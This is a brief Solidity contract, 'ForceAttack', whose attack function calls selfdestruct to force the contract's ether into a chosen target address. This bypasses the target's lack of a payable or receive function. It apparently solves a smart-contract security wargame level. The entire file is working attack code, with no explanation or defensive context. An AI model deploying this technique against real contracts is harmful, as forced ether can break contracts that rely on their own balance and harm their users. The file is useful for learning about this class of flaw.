// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() {}

    function attack(address _target) public payable {
        selfdestruct(payable(_target));
    }
}
